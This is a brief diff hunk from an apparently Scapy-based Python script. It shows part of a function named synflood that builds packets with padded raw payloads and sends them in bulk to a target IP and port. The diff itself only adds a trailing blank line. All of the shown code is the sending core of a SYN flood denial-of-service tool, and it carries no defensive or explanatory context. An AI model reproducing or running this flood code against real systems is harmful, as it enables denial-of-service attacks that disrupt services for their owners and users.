@@ -6,3 +6,4 @@ def synflood (targetip, targetport, number, size):
     data = Raw(b"X" * size)
     p = ip / tcp / data
     send(p, count=number, verbose=0)
+
